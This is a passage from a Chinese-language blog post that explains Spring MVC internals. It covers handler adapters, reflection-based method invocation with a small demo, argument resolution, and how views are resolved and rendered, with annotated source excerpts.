<p>而不像前置方法那样会中途不进行后续拦截器的前置方法了，从前到后。</p>
<p>两者的执行顺序也很好的对应起来。</p>
<blockquote>
<p>拦截器的AOP内</p>
<p>AOP思想是Spring框架的两大核心之一，是解决方法调用依赖以及提高方便后期代码维护的重要思想。</p>
<p>它是把我们代码中高度重复的部分抽取出来，并在适当的时机，通过代理机制来执行，从而做到不修改源码对已经写好的方法进行增强。 </p>
<p>而拦截器正式这种思想的具体实现。</p>
</blockquote>
<h3 id="适配器执行handle方法"><a href="#适配器执行handle方法" class="headerlink" title="适配器执行handle方法"></a>适配器执行handle方法</h3><p>拿到处理器适配器后，经过拦截器的前置方法的调用，再通过其<code>handle</code>方法调用传入的处理器。前面我们介绍了，根据处理器的不同实现，会找到不同的处理器适配器，下面我们就介绍两种不同的处理器是配置。</p>
<h4 id="基于Controller接口"><a href="#基于Controller接口" class="headerlink" title="基于Controller接口"></a>基于Controller接口</h4><p>如果处理器是基于Controller接口实现的，那么使用的处理器适配器是SimpleControllerHandlerAdapter：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">handle</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                           HttpServletResponse response, Object handler)</span>      </span><br><span class="line">                           <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">// 把Handler转成Controller，因为Handler实现了Controller接口</span></span><br><span class="line">   <span class="comment">// 调用Controller的handleRequest方法</span></span><br><span class="line">   <span class="keyword">return</span> ((Controller) handler).handleRequest(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="基于注解"><a href="#基于注解" class="headerlink" title="基于注解"></a>基于注解</h4><p>对于基于注解<code>@Controller</code>实现的处理器，流程相对比较复杂，原因如下：</p>
<ul>
<li>上面这种处理器都是基于接口的，一个实现类中只有一个具体的处理方法，拿到该类的Bean后就可以直接调用方法。而<code>@Controller</code>标注的处理器类中，可能有很多<code>@RequestMapping</code>方法。</li>
<li>上面两种处理器的方法中的参数都是<code>HttpServletRequest</code>和<code>HttpServletResponse</code>对象，直接传入即可。而通过注解<code>@RequestMapping</code>标注的处理器方法中，参数是程序员自定义的，这就涉及到了<strong>参数解析与注入</strong>的问题。</li>
</ul>
<p>其实我们也比较喜欢使用注解的方式来调用，那么仔细研究注解的处理器调用吧</p>
<p>基于注解<code>@Controller</code>的处理器适配器是<code>RequestMappingHandlerAdapter</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//基本调用</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> ModelAndView <span class="title function_">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> handleInternal(request, response, (HandlerMethod) handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> ModelAndView <span class="title function_">handleInternal</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                      HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    ModelAndView mav;</span><br><span class="line">    checkRequest(request);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute invokeHandlerMethod in synchronized block if required.</span></span><br><span class="line">    <span class="comment">// 都是调用invokeHandlerMethod方法</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.synchronizeOnSession) &#123;</span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (session != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">mutex</span> <span class="operator">=</span> WebUtils.getSessionMutex(session);</span><br><span class="line">            <span class="keyword">synchronized</span> (mutex) &#123;</span><br><span class="line">                mav = invokeHandlerMethod(request, response, handlerMethod);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No HttpSession available -&gt; no mutex necessary</span></span><br><span class="line">            mav = invokeHandlerMethod(request, response, handlerMethod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// No synchronization on session demanded at all...</span></span><br><span class="line">        mav = invokeHandlerMethod(request, response, handlerMethod);</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">        <span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> ModelAndView <span class="title function_">invokeHandlerMethod</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                           HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletWebRequest</span> <span class="variable">webRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletWebRequest</span>(request, response);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">WebDataBinderFactory</span> <span class="variable">binderFactory</span> <span class="operator">=</span> getDataBinderFactory(handlerMethod);</span><br><span class="line">        <span class="type">ModelFactory</span> <span class="variable">modelFactory</span> <span class="operator">=</span> getModelFactory(handlerMethod, binderFactory);</span><br><span class="line">        <span class="comment">//非核心代码</span></span><br><span class="line">        ............</span><br><span class="line"></span><br><span class="line">            invocableMethod.invokeAndHandle(webRequest, mavContainer);</span><br><span class="line">        <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        webRequest.requestCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invokeAndHandle</span><span class="params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span></span><br><span class="line"><span class="params">                            Object... providedArgs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用invokeForRequest</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);</span><br><span class="line">    setResponseStatus(webRequest);</span><br><span class="line">    <span class="comment">//一些判断然后return方法</span></span><br><span class="line">    ..............</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另起一个再来看，比较清楚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invokeForRequest</span><span class="params">(NativeWebRequest request, <span class="meta">@Nullable</span> ModelAndViewContainer mavContainer, Object... providedArgs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 通过getMethodArgumentValues方法获取请求参数</span></span><br><span class="line">    Object[] args = <span class="built_in">this</span>.getMethodArgumentValues(request, mavContainer, providedArgs);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.logger.trace(<span class="string">&quot;Arguments: &quot;</span> + Arrays.toString(args));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通过doInvoke调用处理器，通过反射调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.doInvoke(args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取请求参数</span></span><br><span class="line"><span class="keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="meta">@Nullable</span> ModelAndViewContainer mavContainer, Object... providedArgs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//请求参数不为空</span></span><br><span class="line">    <span class="keyword">if</span> (ObjectUtils.isEmpty(<span class="built_in">this</span>.getMethodParameters())) &#123;</span><br><span class="line">        <span class="keyword">return</span> EMPTY_ARGS;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//拿到设置的参数</span></span><br><span class="line">        MethodParameter[] parameters = <span class="built_in">this</span>.getMethodParameters();</span><br><span class="line">        Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[parameters.length];</span><br><span class="line">        <span class="comment">//遍历参数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameters.length; ++i) &#123;</span><br><span class="line">            <span class="type">MethodParameter</span> <span class="variable">parameter</span> <span class="operator">=</span> parameters[i];</span><br><span class="line">            parameter.initParameterNameDiscovery(<span class="built_in">this</span>.parameterNameDiscoverer);</span><br><span class="line">            args[i] = findProvidedArgument(parameter, providedArgs);</span><br><span class="line">            <span class="keyword">if</span> (args[i] == <span class="literal">null</span>) &#123;</span><br><span class="line">                ...........</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 通过HandlerMethodArgumentResolverComposite参数</span></span><br><span class="line">                        <span class="comment">// 解析组件的resolveArgument方法解析参数</span></span><br><span class="line">                        args[i] = <span class="built_in">this</span>.resolvers.resolveArgument(parameter, </span><br><span class="line">                                                                 mavContainer, request, <span class="built_in">this</span>.dataBinderFactory);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                        ..........</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回参数数组</span></span><br><span class="line">        <span class="keyword">return</span> args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用处理器</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">doInvoke</span><span class="params">(Object... args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 这里就调用Controller里的对应方法</span></span><br><span class="line">        <span class="comment">// 通过反射：</span></span><br><span class="line">        <span class="comment">// getBean()就是Controller的实例</span></span><br><span class="line">        <span class="comment">// args就是参数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getBridgedMethod().invoke(<span class="built_in">this</span>.getBean(), args);</span><br><span class="line">    &#125;...........</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Method <span class="title function_">getBridgedMethod</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//这里的是</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.bridgedMethod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/18/vemRB6luZpJ8rqf.jpg"
                      alt="Screenshot_84.jpg"
                ></p>
<p>通过这个看到了我们的<code>getBridgedMethod()</code>可以得到具体方法的<code>Method</code>类。</p>
<blockquote>
<p>这里附送一个反射的Demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoInvoke</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;被反射了&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;name参数：&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//一定要全限定类名来获取Class对象</span></span><br><span class="line">        Class&lt;?&gt; demoInvoke = Class.forName(<span class="string">&quot;com.example.mvcdemo.invokeLi.DemoInvoke&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">liduoan</span> <span class="operator">=</span> demoInvoke.newInstance();</span><br><span class="line">        <span class="comment">//获取Method类</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">put</span> <span class="operator">=</span> demoInvoke.getMethod(<span class="string">&quot;put&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">//直接唤醒方法</span></span><br><span class="line">        put.invoke(liduoan,<span class="string">&quot;liduoan&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>好的，接下来我们接着再看下参数解析吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">resolveArgument</span><span class="params">(MethodParameter parameter, <span class="meta">@Nullable</span> ModelAndViewContainer mavContainer, NativeWebRequest webRequest, <span class="meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">HandlerMethodArgumentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="built_in">this</span>.getArgumentResolver(parameter);</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> ....</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//返回AbstractNamedValueMethodArgumentResolver的resolveArgument方法</span></span><br><span class="line">        <span class="keyword">return</span> resolver.resolveArgument(parameter, mavContainer, </span><br><span class="line">                                        webRequest, binderFactory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AbstractNamedValueMethodArgumentResolver类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">resolveArgument</span><span class="params">(MethodParameter parameter, <span class="meta">@Nullable</span> ModelAndViewContainer mavContainer, NativeWebRequest webRequest, <span class="meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    AbstractNamedValueMethodArgumentResolver.<span class="type">NamedValueInfo</span> <span class="variable">namedValueInfo</span> <span class="operator">=</span> <span class="built_in">this</span>.getNamedValueInfo(parameter);</span><br><span class="line">    <span class="type">MethodParameter</span> <span class="variable">nestedParameter</span> <span class="operator">=</span> parameter.nestedIfOptional();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">resolvedName</span> <span class="operator">=</span> <span class="built_in">this</span>.resolveStringValue(namedValueInfo.name);</span><br><span class="line"></span><br><span class="line">    .....</span><br><span class="line">   <span class="comment">// 根据参数名解析出参数，调用子类的resolveName方法，有很多实现子类比如：</span></span><br><span class="line">   <span class="comment">// 1.RequestParamMethodArgumentResolver没有注解</span></span><br><span class="line">   <span class="comment">// 2.PathVariableMethodArgumentResolver有@PathVariable注解</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg</span> <span class="operator">=</span> <span class="built_in">this</span>.resolveName(resolvedName.toString(), nestedParameter, webRequest);</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拿子类RequestParamMethodArgumentResolver为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">resolveName</span><span class="params">(String name, MethodParameter parameter, NativeWebRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="type">HttpServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> request.getNativeRequest(HttpServletRequest.class);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (servletRequest != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">mpArg</span> <span class="operator">=</span> MultipartResolutionDelegate.resolveMultipartArgument(name, parameter, servletRequest);</span><br><span class="line">      <span class="keyword">if</span> (mpArg != MultipartResolutionDelegate.UNRESOLVABLE) &#123;</span><br><span class="line">         <span class="keyword">return</span> mpArg;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">Object</span> <span class="variable">arg</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="type">MultipartHttpServletRequest</span> <span class="variable">multipartRequest</span> <span class="operator">=</span> request.getNativeRequest(MultipartHttpServletRequest.class);</span><br><span class="line">   <span class="comment">// 针对文件上传</span></span><br><span class="line">   <span class="keyword">if</span> (multipartRequest != <span class="literal">null</span>) &#123;</span><br><span class="line">      List&lt;MultipartFile&gt; files = multipartRequest.getFiles(name);</span><br><span class="line">      <span class="keyword">if</span> (!files.isEmpty()) &#123;</span><br><span class="line">         arg = (files.size() == <span class="number">1</span> ? files.get(<span class="number">0</span>) : files);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (arg == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 最终通过request的getParameterValues方法拿到参数</span></span><br><span class="line">      String[] paramValues = request.getParameterValues(name);</span><br><span class="line">      <span class="keyword">if</span> (paramValues != <span class="literal">null</span>) &#123;</span><br><span class="line">         arg = (paramValues.length == <span class="number">1</span> ? paramValues[<span class="number">0</span>] : paramValues);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这里结束可以简略的得到下面的图：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/18/lTAmk1HnYbEe7Fc.jpg"
                      alt="Screenshot_86.jpg"
                ></p>
<h3 id="视图解析器-1"><a href="#视图解析器-1" class="headerlink" title="视图解析器"></a>视图解析器</h3><p>在前端控制器DispatcherServlet中调用<code>processDispatchResult</code>方法获取处理ModelAndView结果对象：</p>
<p><code>processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</code></p>
<p>↑这就是方法调用全局。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processDispatchResult</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params"><span class="meta">@Nullable</span> HandlerExecutionChain mappedHandler,</span></span><br><span class="line"><span class="params"><span class="meta">@Nullable</span> ModelAndView mv,<span class="meta">@Nullable</span> Exception exception)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">errorView</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="comment">//有异常情况，就debug，然后再mv中设置信息</span></span><br><span class="line">    <span class="keyword">if</span> (exception != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exception <span class="keyword">instanceof</span> ModelAndViewDefiningException) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;ModelAndViewDefiningException encountered&quot;</span>, exception);</span><br><span class="line">            mv = ((ModelAndViewDefiningException) exception).getModelAndView();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> (mappedHandler != <span class="literal">null</span> ? mappedHandler.getHandler() : <span class="literal">null</span>);</span><br><span class="line">            mv = processHandlerException(request, response, handler, exception);</span><br><span class="line">            errorView = (mv != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the handler return a view to render?</span></span><br><span class="line">    <span class="comment">// ModelAndView不为空</span></span><br><span class="line">    <span class="keyword">if</span> (mv != <span class="literal">null</span> &amp;&amp; !mv.wasCleared()) &#123;</span><br><span class="line">        <span class="comment">// 调用render渲染数据</span></span><br><span class="line">        render(mv, request, response);</span><br><span class="line">        <span class="keyword">if</span> (errorView) &#123;</span><br><span class="line">            WebUtils.clearErrorRequestAttributes(request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    .........</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// Determine locale for request and apply it to the response.</span></span><br><span class="line">    <span class="type">Locale</span> <span class="variable">locale</span> <span class="operator">=</span></span><br><span class="line">        (<span class="built_in">this</span>.localeResolver != <span class="literal">null</span> ? <span class="built_in">this</span>.localeResolver.resolveLocale(request) : request.getLocale());</span><br><span class="line">    response.setLocale(locale);</span><br><span class="line"></span><br><span class="line">    View view;</span><br><span class="line">    <span class="comment">//获取视图名称</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">viewName</span> <span class="operator">=</span> mv.getViewName();</span><br><span class="line">    <span class="keyword">if</span> (viewName != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// We need to resolve the view name.</span></span><br><span class="line">        <span class="comment">// 调用resolveViewName方法</span></span><br><span class="line">        <span class="comment">// 通过视图解析器解析视图名称，返回View对象</span></span><br><span class="line">        view = resolveViewName(viewName, mv.getModelInternal(), locale, request);</span><br><span class="line">      </span><br><span class="line">	.......</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mv.getStatus() != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.setStatus(mv.getStatus().value());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//使用render渲染数据</span></span><br><span class="line">        view.render(mv.getModelInternal(), request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 通过视图解析器解析视图名称，返回View对象</span></span><br><span class="line"><span class="keyword">protected</span> View <span class="title function_">resolveViewName</span><span class="params">(String viewName, <span class="meta">@Nullable</span> Map&lt;String, Object&gt; model,</span></span><br><span class="line"><span class="params">		Locale locale, HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="comment">//视图解析器集合不为空</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.viewResolvers != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 遍历视图解析器</span></span><br><span class="line">		<span class="keyword">for</span> (ViewResolver viewResolver : <span class="built_in">this</span>.viewResolvers) &#123;</span><br><span class="line">               <span class="comment">// 通过视图解析器的resolveViewName方法解析视图，得到视图对象</span></span><br><span class="line">               <span class="comment">// 这里最终会调用到UrlBasedViewResolver类的createView方法</span></span><br><span class="line">               <span class="comment">// 它是我们常用的InternalResourceViewResolver的父类</span></span><br><span class="line">			<span class="type">View</span> <span class="variable">view</span> <span class="operator">=</span> viewResolver.resolveViewName(viewName, locale);</span><br><span class="line">			<span class="keyword">if</span> (view != <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="comment">// 视图对象不为空说明解析成功，直接返回</span></span><br><span class="line">				<span class="keyword">return</span> view;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/19/V986dqthIbJD52a.jpg"
                      alt="Screenshot_87.jpg"
                ></p>
<p>我们先看看对应的<code>viewResolver.resolveViewName</code>方法：</p>
<p>就先看一个实现类[也是一个视图解析器类]：<code>AbstractCachingViewResolver</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">public</span> View <span class="title function_">resolveViewName</span><span class="params">(String viewName, Locale locale)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 这个内存是不大于0 就为false 进入方法内</span></span><br><span class="line">    <span class="comment">// 也就是这个解析器中没有任何的视图，直接创造一个</span></span><br><span class="line">    <span class="keyword">if</span> (!isCache()) &#123;</span><br><span class="line">        <span class="keyword">return</span> createView(viewName, locale);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//通过视图获取key</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">cacheKey</span> <span class="operator">=</span> getCacheKey(viewName, locale);</span><br><span class="line">        <span class="comment">//通过key获取对应视图</span></span><br><span class="line">        <span class="type">View</span> <span class="variable">view</span> <span class="operator">=</span> <span class="built_in">this</span>.viewAccessCache.get(cacheKey);</span><br><span class="line">        <span class="comment">//如果这个视图获取为空</span></span><br><span class="line">        <span class="keyword">if</span> (view == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//加锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>.viewCreationCache) &#123;</span><br><span class="line">                <span class="comment">//简单的并发单例</span></span><br><span class="line">                view = <span class="built_in">this</span>.viewCreationCache.get(cacheKey);</span><br><span class="line">                <span class="comment">//还是为空</span></span><br><span class="line">                <span class="keyword">if</span> (view == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Ask the subclass to create the View object.</span></span><br><span class="line">                    <span class="comment">// 创造一个</span></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                    猜测是每个解析器有只能生产特定的视图。</span></span><br><span class="line"><span class="comment">                    所有可能生产不出来为空</span></span><br><span class="line"><span class="comment">                    这也是上面遍历解析器的时候，得到的View可能为null的原因</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                    view = createView(viewName, locale);</span><br><span class="line">                    <span class="keyword">if</span> (view == <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.cacheUnresolved) &#123;</span><br><span class="line">                        view = UNRESOLVED_VIEW;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (view != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.viewAccessCache.put(cacheKey, view);</span><br><span class="line">                        <span class="built_in">this</span>.viewCreationCache.put(cacheKey, view);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">                logger.trace(formatKey(cacheKey) + <span class="string">&quot;served from cache&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (view != UNRESOLVED_VIEW ? view : <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按我们上面的图的说法，得到了View之后，我们就可以调用他的<code>render</code>进行渲染了。</p>
<p>那么我们再看下视图的抽象父类AbstractView中的render方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">(<span class="meta">@Nullable</span> Map&lt;String, ?&gt; model, HttpServletRequest request,</span></span><br><span class="line"><span class="params">                   HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="comment">//一大串Log</span></span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    Map&lt;String, Object&gt; mergedModel = createMergedOutputModel(model, request, response);</span><br><span class="line">    prepareResponse(request, response);</span><br><span class="line">    <span class="comment">// 调用renderMergedOutputModel方法</span></span><br><span class="line">    renderMergedOutputModel(mergedModel, getRequestToExpose(request), response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 抽象类方法</span></span><br><span class="line"><span class="comment">// 调用视图的具体实现类的renderMergedOutputModel</span></span><br><span class="line"><span class="comment">// InternalResourceView就是我们最常用的视图实现，它针对JSP</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">renderMergedOutputModel</span><span class="params">(</span></span><br><span class="line"><span class="params">    Map&lt;String, Object&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception;</span><br></pre></td></tr></table></figure>

<p>注意到，如果选用AbstractView这个抽象父类的话，其抽象方法为：<code>renderMergedOutputModel</code></p>
<p>也就是说继承这个抽象父类的子类，仅仅需要实现这个抽象方法，而不必理会<code>render</code>方法，也就是不需要重写。</p>
<p>那么我们可以看看其实现类InternalResourceView的具体实现了：</p>
